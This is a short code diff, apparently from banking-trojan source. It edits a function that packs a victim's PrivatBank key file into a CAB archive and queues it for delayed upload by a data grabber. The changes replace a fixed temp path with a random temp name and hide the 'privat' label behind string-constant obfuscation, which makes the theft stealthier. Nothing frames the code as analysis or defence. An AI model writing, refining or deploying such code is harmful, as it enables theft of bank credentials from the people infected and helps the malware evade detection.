@@ -9,6 +9,7 @@
 #include "Utils.h"
 #include "Loader.h"
 #include "CabPacker.h"
+#include "StrConsts.h"
 
 void SendPrivatBankKey(const char* Command, const char* Params);
 
@@ -86,7 +87,7 @@ void SendPrivatBankKey(const char* Command, const char* Params)
 		return;
 
 	// Добавляем фал в архив
-	string FN = "c:\\temp\\privat.cab";//File::GetTempName2A();
+	string FN = File::GetTempName2A();
 
 	HCAB Cab = CreateCab(FN.t_str());
 	if (Cab)
@@ -94,7 +95,7 @@ void SendPrivatBankKey(const char* Command, const char* Params)
 		PCHAR Name = File::ExtractFileNameA((PCHAR)Params, false);
 		bool Added = AddFileToCab(Cab, Params, Name);
 
-		DataGrabber::SendCabDelayed(NULL, FN.t_str(), "privat");
+		DataGrabber::SendCabDelayed(NULL, FN.t_str(), GetStr(EStrSystemPrivat).t_str());
 
 		CloseCab(Cab);
 	}
